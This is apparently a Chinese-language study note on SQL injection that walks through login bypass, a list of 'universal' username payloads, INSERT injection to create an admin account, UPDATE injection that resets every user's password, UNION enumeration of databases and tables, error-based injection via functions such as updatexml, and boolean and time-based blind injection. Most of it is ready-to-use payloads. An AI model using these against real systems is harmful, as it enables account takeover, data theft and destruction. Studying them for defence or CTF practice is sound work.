一、SQL注入

1、原理

解释型语言的执行方式产生了_代码注入_的漏洞。利用这种漏洞提交含语法的句式，从而对程序进行攻击

2、基本漏洞

1. 假设有一个登陆界面，需提交用户名及密码。若已知用户名为guoyanan，则可构造guoyanan' --输入进用户名,程序将执行SELECT * FROM XX WHERE username='guoyanan' -- '........., --后面的语句将被当成注释忽略,起到绕过密码的作用。

*2.OR 1=1 -- 一样可以起到这种作用，提交后，程序将执行SELECT * FROM XX WHERE username=' ' OR 1=1 --,执行的结果将会返回XX表中的所有数据 *

3.因为提交的句式的末尾会生成一个 ‘ ，我们也可以提交guoyanan' OR 'a'='a从而不用注释也可以平衡执行语句的引号。

常用的万能username语句：

  • a ’ or 1=1 #

  • a ") or 1=1 #

  • a‘) or 1=1 #*

  • a” or “1”=”1

  • ' or '1'='1

  • ' or (length(database())) = 8 (用于输入’ “都没有错误)

  • ' or (ascii(substr((select database()) ,1,1))) = 115 # (用于输入’ “都没有错误)

  • ") or ("1")=("1

  • ") or 1=1 or if(1=1, sleep(1), null) #

  • ") or (length(database())) = 8 #

  • ") or (ascii(substr((select database()) ,1,1))) = 115 or if(1=1, sleep(1), null) #

3.INSERT语句

INSERT用于创建一新行，例如INSERT INTO XX (name,year,sex,isadmin) VALUE ('guoyanan',19,1,0)，其中isadmin代表是否具有管理员权限。

我们可以建立一个新行，提交admin',100,1,1) --来创建一个具有管理员权限的帐号，若是字段中含有密码password,我们就可以随便设立一个密码，通过已知密码的管理员帐号进入数据库了。

另外，通过拦截到的数据库的版本字符串，把它插入自己用户资料的一个字段中；一般数据库会显示其版本信息。

有时候我们并不知道有多少个字段，我们就可以逐个增加，从guoyanan',1) --到guoyanan',1,1,1....) --,因为大部分数据库会自动将整数转为字符串。若是1被拒绝，可以尝试200，2000之类。

4、UPDATE语句

UPDATE XX SET password ='new-pass' WHERE user='xx' and password='old-pass',将某一行原有某字段的值替换为新的。我们依然可以通过绕过来更新别人的密码。例如输入XX' --，如果将注释符替换为or 1=1 --,那就能替换所有用户的密码了，

5、DELETE语句

DELETE用于删除表中一个或多个行。与UPDATE类似，可以恶意破坏数据

6、联合查询

最常见的union注入：

先查库名：

先输入' UNION SELECT DATABASE()

执行SELECT A FROM B WHERE C='' UNION SELECT DATABASE()

只返回了union查询的值，返回了数据库名

再查表名：

输入' union select group_concat(table_name) from information_schema.tables where table_schema=database()%23,

假设返回的表名为table1

再差字段名：

假设这个表里有flag，我们查查flag字段

' union select flag from table1%23

这是一个基本的注入过程

7、报错注入

十种常见注入

1.floor()

select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);

2、extractvalue()

select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));

3、updatexml()

select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));

4、geometrycollection()

select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));

5、multipoint()

select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));

剩下的还有polygon，multipolygon，linestring，multilinestring，exp

但是常见的只有floor，updatexml，extractvalue三种~

8、布尔盲注

1、返回值只有TRUE或FALSE

若查询结果不为空，返回True，否则返回False

例如' and length(database())=8

2、Orderby盲注

' order by rand(database='happy')

当rand里的值分别为true或false时，排序的结果是不同的，可以通过这来判断值是否正确

9、时间盲注

有时候在SQL语句执行后，页面并不会返回数据到前端，因此可采用时间盲注判断

' or sleep(3)%23

' or if(database='happy',sleep(3),0)

(若查询结果正确，则延迟3秒，否则无延时
